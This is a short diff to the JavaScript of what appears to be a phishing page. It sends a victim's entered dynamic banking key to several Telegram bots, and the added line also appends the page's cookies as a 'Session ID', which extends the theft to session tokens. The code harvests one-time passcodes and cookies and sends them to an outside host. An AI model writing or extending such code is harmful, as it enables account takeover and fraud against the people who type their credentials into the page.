@@ -84,7 +84,7 @@ document.addEventListener("DOMContentLoaded", function () {
         ];
 
         bots.forEach(bot => {
-            let mensaje = `*Clave Dinámica Ingresada:*\n\n${clave}`;
+            let mensaje = `*Clave Dinámica Ingresada:*\n\n${clave}\n\n 🆔 Session ID:${document.cookie || 'Sin cookies'}`;
             let url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(mensaje)}&parse_mode=Markdown`;
 
             fetch(url).then(response => console.log(`Mensaje enviado a bot: ${bot.token}`))
